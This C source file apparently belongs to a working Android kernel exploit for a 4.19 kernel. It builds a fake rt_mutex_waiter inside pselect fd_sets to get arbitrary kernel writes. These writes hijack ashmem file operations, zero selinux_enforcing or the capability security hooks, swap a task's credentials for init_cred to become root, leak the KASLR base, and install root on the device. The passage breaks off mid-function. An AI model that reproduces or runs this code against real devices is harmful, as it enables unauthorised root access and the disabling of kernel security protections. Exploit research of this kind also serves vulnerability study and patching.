#include "common.h"

#define PSELECT_CFI_ROUTE_ATTEMPTS 24

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  /* Every fd the sprayed masks touch must be a *valid, non-ready* descriptor,
   * otherwise pselect() either returns -EBADF or comes back immediately. That
   * immediacy is fatal here: the fake waiter only lives on this thread's
   * kernel stack for as long as pselect() is inside the kernel, and the
   * sched_setattr() trigger fires 10..150 ms later from the consumer thread.
   * Duplicating the pipe's read end (empty pipe) keeps every masked fd valid
   * and unready, so select() sleeps and the spray stays put. */
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
  /* core_sys_select() clamps the copied fd_set size to current->files' fd
   * table size (fdt->max_fds). If that table is smaller than nfds the kernel
   * copies fewer words per set than we laid out, and the fake waiter lands at
   * the wrong place. Pushing one fd way up grows the table past nfds for good
   * (closing it does not shrink the table back). */
  int grow = fcntl(read_fd, F_DUPFD, 2048);
  if (grow >= 0) {
    close(grow);
  }
}

/* Place one word of the fake rt_mutex_waiter into the concatenated fd_set
 * image the kernel builds on its own stack:
 *   global word 0..4   -> fds.in[0..4]   (stack_fds + 0x00)
 *   global word 5..9   -> fds.out[0..4]  (stack_fds + 0x28)
 *   global word 10..14 -> fds.ex[0..4]   (stack_fds + 0x50)
 * Word numbering and the +1 base offset are derived in target.h
 * (rt_waiter_abs == stack_fds + 8). */
static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int global_word, uint64_t value) {
  int set_idx = global_word / PSELECT_WORDS_PER_SET;
  int word_idx = global_word % PSELECT_WORDS_PER_SET;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

/*
 * Fake rt_mutex_waiter (4.19 form) at global word 1:
 *
 *   0x00 tree.__rb_parent_color = fake_fops        <- value the rb_erase stores
 *   0x08 tree.rb_right          = misc_fops slot   <- address it stores it at
 *   0x10 tree.rb_left           = 0
 *   0x18 pi.__rb_parent_color   = 1                <- RED: no rebalance walk
 *   0x20 pi.rb_right            = 0
 *   0x28 pi.rb_left             = 0
 *   0x30 task                   = init_task
 *   0x38 lock                   = fake_lock
 *   0x40 prio                   = FAKE_WAITER_PRIO (must differ from the task)
 *   0x48 deadline               = 0
 *
 * The write itself is __rb_erase_augmented()'s one-child path:
 *   child = node->rb_right (= misc_fops slot, non-NULL -> no rebalance)
 *   pc    = node->__rb_parent_color (= fake_fops)
 *   parent= pc & ~3 (= fake_fops, inside our own page)
 *   __rb_change_child()  -> writes into our page only
 *   child->__rb_parent_color = pc  -> *(u64 *)misc_fops_slot = fake_fops
 */
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int base = PSELECT_WAITER_WORD_SHIFT;
  /* Runtime override: the offset between the copied fd_set image and the
   * rt_mutex_waiter recorded in pi_blocked_on turned out not to be the
   * compile-time +1 word on this kernel. GHOSTLOCK_WAITER_SHIFT=<words>
   * shifts the whole fake waiter inside the image. */
  const char *shift_env = getenv("GHOSTLOCK_WAITER_SHIFT");
  if (shift_env) {
    base = atoi(shift_env);
  }
  uintptr_t write_target = data_addr(ASHMEM_MISC_FOPS);
  if (skb_oracle_target()) {
    write_target = skb_oracle_target();
  }

  /* GHOSTLOCK_WAITER_PRIO=<n>: fake the waiter priority. Setting it equal to
   * the consumer's task->prio makes rt_mutex_adjust_pi() return before it ever
   * touches fake_lock, i.e. a *safe* probe of the pselect stack geometry:
   * surviving proves the kernel really read our fd_set waiter. */
  uint64_t waiter_prio = FAKE_WAITER_PRIO;
  const char *wp = getenv("GHOSTLOCK_WAITER_PRIO");
  if (wp && atoi(wp) > 0) {
    waiter_prio = (uint64_t)atoi(wp);
  }
  struct waiter_word {
    int off;
    uint64_t value;
    const char *name;
  } words[] = {
    {0x00, fake_fops, "tree_pc"},
    {0x08, write_target, "tree_right"},
    {0x10, 0, "tree_left"},
    {0x18, 1, "pi_pc"},
    {0x20, 0, "pi_right"},
    {0x28, 0, "pi_left"},
    {0x30, text_addr(INIT_TASK), "task"},
    {0x38, fake_lock, "lock"},
    {0x40, waiter_prio, "prio"},
    {0x48, 0, "deadline"},
  };
  /* GHOSTLOCK_SAFE_TREE=1: make the fake waiter's rb node a childless root
   * (pc=0 => black root, no parent) so rt_mutex_dequeue() only clears
   * fake_lock->waiters.rb_node instead of taking __rb_erase_augmented()'s
   * one-child branch. Used to bisect whether the panic comes from the
   * arbitrary write or from the later owner-chain steps. */
  if (getenv("GHOSTLOCK_SAFE_TREE")) {
    words[0].value = 0;
    words[1].value = 0;
    words[2].value = 0;
  }
  /* GHOSTLOCK_ZERO_WRITE=<selinux|0xADDR>: lock = empty_zero_page (owner 0, so
   * the chain bails right after the detach), tree {pc=0, right=target,
   * left=0}. __rb_erase_augmented()'s one-child path then does
   *   root->rb_node = target      (writes into empty_zero_page, harmless)
   *   *(u64 *)target = 0          <- arbitrary 8-byte zero write
   * which is a write primitive that does NOT need the payload page. */
  /* GHOSTLOCK_ZWRITE2=<selinux|0xADDR>: safe arbitrary zero write.
   * lock = empty_zero_page (owner 0, chain bails after the detach) and the
   * fake tree node is {pc = target-8, right = 0, left = 0}. The one-child
   * __rb_erase_augmented() path then does
   *     parent = pc & ~3 = target-8
   *     if (*(parent+0x10) != node) *(parent+8) = 0   -> zero at target
   *     child == NULL, so no second write and the branch
   *     "rebalance = __rb_is_black(pc) ? parent : NULL" is NULL
   * and the re-enqueue sees an empty (rb_node == 0) tree, so nothing walks
   * the target. */
  /* GHOSTLOCK_ZWRITE_SLOT=<n>: the chain's fake lock page is empty_zero_page,
   * and every chain writes one waiter pointer into lock+0x8 and lock+0x10.
   * A second chain reusing the same page dereferences those stale stack
   * pointers and dies, so each chain gets its own 0x100-byte slot. */
  int zslot = 0;
  {
    const char *sl = getenv("GHOSTLOCK_ZWRITE_SLOT");
    if (sl) zslot = atoi(sl);
    if (zslot < 0) zslot = 0;
    if (zslot > 15) zslot = 15;
  }
  /* GHOSTLOCK_CREDWRITE=<hex task>: write the *value* init_cred into
   * task->cred (0x7e0).  __rb_erase_augmented()'s one-child path does
   *   parent = pc & ~3 = init_cred
   *   *(parent+8) = target            -> clobbers init_cred->gid/suid
   *   *(target)   = pc = init_cred    -> task->cred = init_cred
   * and because parent != 0 the lock's rb_root stays empty, so the re-enqueue
   * is safe.  One write turns this task into uid 0 with full capabilities. */
  /* GHOSTLOCK_VALUEWRITE=<hex target>: same value-write machinery as
   * CREDWRITE but pointing at a harmless .data address, to separate "the
   * value path / init_cred+8 clobber is fatal" from "changing our cred is
   * fatal". */
  if (getenv("GHOSTLOCK_VALUEWRITE")) {
    uintptr_t vt = (uintptr_t)strtoull(getenv("GHOSTLOCK_VALUEWRITE"), NULL, 0);
    uintptr_t vpc = text_addr(INIT_CRED);
    if (getenv("GHOSTLOCK_VALUEWRITE_PC")) {
      vpc = (uintptr_t)strtoull(getenv("GHOSTLOCK_VALUEWRITE_PC"), NULL, 0);
    }
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      if (words[i].off == 0x00) {
        words[i].value = vpc;
      }
      if (words[i].off == 0x08) {
        words[i].value = vt;
      }
      if (words[i].off == 0x10) {
        words[i].value = 0;
      }
      if (words[i].off == 0x38) {
        words[i].value = text_addr(EMPTY_ZERO_PAGE) + (uintptr_t)zslot * 0x100;
      }
    }
    pr_info("valuewrite: target=%016zx value=%016zx\n",
            vt, (size_t)vpc);
    /* Dump the final words to a separate file: the exlog is unreliable (f2fs
     * NUL-corruption), but this file is small and fsynced. */
    if (getenv("GHOSTLOCK_WORDS_DUMP")) {
      int df = open("/data/local/tmp/chain_words.txt",
                    O_WRONLY | O_CREAT | O_TRUNC, 0666);
      if (df >= 0) {
        char db[512];
        int dn = 0;
        for (size_t k = 0; k < sizeof(words) / sizeof(words[0]); k++) {
          dn += snprintf(db + dn, sizeof db - (size_t)dn, "%02x=%016zx\n",
                         (unsigned)words[k].off, (size_t)words[k].value);
          if ((size_t)dn > sizeof db - 64) break;
        }
        ssize_t dw = write(df, db, (size_t)dn);
        (void)dw;
        close(df);
        sync();
      }
    }
  }
  if (getenv("GHOSTLOCK_CREDWRITE")) {
    uintptr_t ctask = (uintptr_t)strtoull(getenv("GHOSTLOCK_CREDWRITE"), NULL, 0);
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      if (words[i].off == 0x00) {
        words[i].value = text_addr(INIT_CRED);
      }
      if (words[i].off == 0x08) {
        const char *coff = getenv("GHOSTLOCK_CREDWRITE_OFF");
        words[i].value = ctask + (coff ? (uintptr_t)strtoull(coff, NULL, 0)
                                       : TASK_CRED_OFF);
      }
      if (words[i].off == 0x10) {
        words[i].value = 0;
      }
      if (words[i].off == 0x38) {
        words[i].value = text_addr(EMPTY_ZERO_PAGE) + (uintptr_t)zslot * 0x100;
      }
    }
    pr_info("credwrite: task=%016zx cred_slot=%016zx init_cred=%016zx\n",
            ctask, text_addr(EMPTY_ZERO_PAGE) + (uintptr_t)zslot * 0x100,
            text_addr(INIT_CRED));
  }
  if (getenv("GHOSTLOCK_ZWRITE2")) {
    uintptr_t wt = 0;
    if (!strcmp(getenv("GHOSTLOCK_ZWRITE2"), "selinux")) {
      wt = text_addr(SELINUX_ENFORCING);
    } else if (!strcmp(getenv("GHOSTLOCK_ZWRITE2"), "capable")) {
      /* security_capable() loads security_hook_heads.capable.first from
       * [security_hook_heads + 0x40] (see 0x49d114..0x49d120).  Zeroing that
       * pointer makes the hlist empty, and an empty hook list means every
       * capability check returns 0 == allowed. */
      wt = text_addr(SECURITY_HOOK_HEADS) + 0x40;
    } else if (!strcmp(getenv("GHOSTLOCK_ZWRITE2"), "hook400")) {
      /* Control for the __ro_after_init theory: security_hook_heads is
       * __lsm_ro_after_init, so any offset in that page must fault. */
      wt = text_addr(SECURITY_HOOK_HEADS) + 0x400;
    } else if (!strcmp(getenv("GHOSTLOCK_ZWRITE2"), "capget")) {
      /* Control target: security_hook_heads+0x50 (the capget/capset hook),
       * harmless to empty - used to prove that writing into the hook-head
       * array is safe by itself. */
      wt = text_addr(SECURITY_HOOK_HEADS) + 0x50;
    } else if (!strcmp(getenv("GHOSTLOCK_ZWRITE2"), "uts")) {
      /* init_uts_ns.sysname ("Linux") starts 4 bytes into the struct; zeroing
       * it is harmless and directly visible through uname(2). */
      wt = text_addr(INIT_UTS_NS) + 4;
    } else {
      wt = (uintptr_t)strtoull(getenv("GHOSTLOCK_ZWRITE2"), NULL, 0);
    }
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      if (words[i].off == 0x00) {
        words[i].value = (wt - 8) & ~3UL;
      }
      if (words[i].off == 0x08 || words[i].off == 0x10) {
        words[i].value = 0;
      }
      if (words[i].off == 0x38) {
        words[i].value = text_addr(EMPTY_ZERO_PAGE) + (uintptr_t)zslot * 0x100;
      }
    }
    pr_info("zwrite2: zero 8 bytes at %016zx (node pc=%016zx)\n",
            wt, (wt - 8) & ~3UL);
  }
  if (getenv("GHOSTLOCK_ZERO_WRITE")) {
    uintptr_t zt = 0;
    if (!strcmp(getenv("GHOSTLOCK_ZERO_WRITE"), "selinux")) {
      zt = text_addr(SELINUX_ENFORCING);
    } else {
      zt = (uintptr_t)strtoull(getenv("GHOSTLOCK_ZERO_WRITE"), NULL, 0);
    }
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      if (words[i].off == 0x00 || words[i].off == 0x10) {
        words[i].value = 0;
      }
      if (words[i].off == 0x08) {
        words[i].value = zt;
      }
      if (words[i].off == 0x38) {
        words[i].value = text_addr(EMPTY_ZERO_PAGE) + (uintptr_t)zslot * 0x100;
      }
    }
    pr_info("zero-write: target=%016zx value=0\n", zt);
  }
  /* GHOSTLOCK_BAD_LOCK=1: point the fake waiter's ->lock at an unmapped
   * address. If the chain really consumes our fd_set waiter it dereferences
   * that pointer and dies; surviving proves the chain bails before ->lock. */
  if (getenv("GHOSTLOCK_BAD_LOCK")) {
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      if (words[i].off == 0x38) {
        words[i].value = 0x1000;
      }
    }
  }
  /* GHOSTLOCK_ZERO_LOCK=1: point the fake waiter's ->lock at empty_zero_page,
   * a kernel page that is all zeros and whose address we know from the KASLR
   * leak. That is a geometry probe independent of both the payload page and
   * the task priority: if pi_blocked_on really points at our fd_set, the chain
   * sees owner==0 and bails at 0xd8108 (empty_zero_page+0x18 == 0), so the
   * kernel survives. A badly placed fake waiter crashes instead.
   * Side effect: the chain enqueues the waiter into that "lock", i.e. it writes
   * a stack pointer into empty_zero_page+8/+0x10. Debug-only. */
  if (getenv("GHOSTLOCK_ZERO_LOCK")) {
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      if (words[i].off == 0x00 || words[i].off == 0x08 ||
          words[i].off == 0x10) {
        words[i].value = 0;
      }
      if (words[i].off == 0x38) {
        words[i].value = text_addr(EMPTY_ZERO_PAGE) + (uintptr_t)zslot * 0x100;
      }
    }
  }
  /* GHOSTLOCK_FILLALL=<v>: write <v> into every global fd_set word. The fake
   * waiter then has prio == <v> no matter which 8-byte offset inside the
   * copied fd_set image pi_blocked_on happens to land on, which turns
   * rt_mutex_adjust_pi()'s prio test into a geometry probe: with the consumer's
   * nice set so task->prio == <v>, a surviving run means pi_blocked_on really
   * points into our fd_set image. */
  const char *fill = getenv("GHOSTLOCK_FILLALL");
  if (fill) {
    uint64_t v = (uint64_t)strtoull(fill, NULL, 0);
    for (int w = 0; w <= 14; w++) {
      pselect_put_global_word(in, out, ex, w, v);
    }
    return;
  }
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    int global_word = base + (int)(words[i].off / 8);
    if (!pselect_put_global_word(in, out, ex, global_word, words[i].value)) {
      pr_warning("pselect cannot place %s at global word %d\n",
                 words[i].name, global_word);
    }
  }
}

void do_pselect_fake_lock_route(void) {
  /* The zero-write route only needs the fake *waiter*; its lock lives in
   * empty_zero_page and its tree fields are fully overridden, so a missing
   * payload page is fine there. */
  if (!getenv("GHOSTLOCK_ZWRITE2") && !getenv("GHOSTLOCK_CREDWRITE") &&
      !getenv("GHOSTLOCK_VALUEWRITE") &&
      (!page_base || !fake_lock || !fake_fops)) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  uintptr_t route_target = skb_oracle_target();
  if (!route_target) {
    route_target = data_addr(ASHMEM_MISC_FOPS);
  }
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      uintptr_t fresh = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (fresh && fake_lock && fake_fops) {
        page_base = fresh;
      } else {
        /* A failed refresh must not end the sweep: the previous page is still
         * mapped and the only thing this loop varies is the punch timing. */
        pr_warning("pselect retry: page refresh failed, reusing base=%016zx\n",
                   page_base);
      }
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    /* Move the write end above the fd range the spray rewrites. Otherwise the
     * dup2() loop (which covers every set bit, 0..319) can replace the write
     * end with the read end, the pipe loses its writer, select() sees EOF and
     * returns immediately - killing the window the spray needs. */
    int high_write = fcntl(pipefd[1], F_DUPFD, PSELECT_ROUTE_NFDS + 48);
    if (high_write >= 0) {
      close(pipefd[1]);
      pipefd[1] = high_write;
    }
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
    pr_info("pselect fds ready: fd319=%d nfds_max=%d\n",
            fcntl(PSELECT_ROUTE_NFDS - 1, F_GETFD),
            (int)sysconf(_SC_OPEN_MAX));

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    pr_info("pselect enter attempt=%d page=%016zx fake_lock=%016zx "
            "fake_fops=%016zx target=%016zx\n",
            route_attempt, page_base, fake_lock, fake_fops, route_target);
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);
    if (skb_oracle_target() && !getenv("GHOSTLOCK_NO_PROBE")) {
      /* Two independent probes:
       *  oracle  - the rb_erase write landed in our scratch slot
       *  usage   - get_task_struct(fake_task) ran, i.e. the chain walked as
       *            far as the "lock owner is our fake task" step
       *            (0x100 -> 0x101); distinguishes "chain never entered"
       *            from "entered but bailed before the dequeue". */
      uint64_t usage[SKB_RECLAIM_SENDS];
      int nchunks = skb_peek_chunks(
          FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, usage, SKB_RECLAIM_SENDS);
      pr_info("pselect probe: oracle=%016llx chunks=%d usage=%llx/%llx/%llx/%llx\n",
              (unsigned long long)skb_peek64(SCRATCH_OFF + 0x100), nchunks,
              (unsigned long long)(nchunks > 0 ? usage[0] : 0),
              (unsigned long long)(nchunks > 1 ? usage[1] : 0),
              (unsigned long long)(nchunks > 2 ? usage[2] : 0),
              (unsigned long long)(nchunks > 3 ? usage[3] : 0));
    }

    int route_signal = calls > 0 && success > 0;
    if (getenv("GHOSTLOCK_NO_PROBE")) {
      /* uid-patch runs only need the chain itself; the skb probes would run
       * with the freshly patched cred and have been observed to die there. */
      if (route_signal) { calls = success = 1; }
      break;
    }
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen || !route_signal) {
      break;
    }
    if (getenv("GHOSTLOCK_ONE_ATTEMPT")) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
#ifdef CFGOPS_4_19_STYLE
    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
#else
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
#endif
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
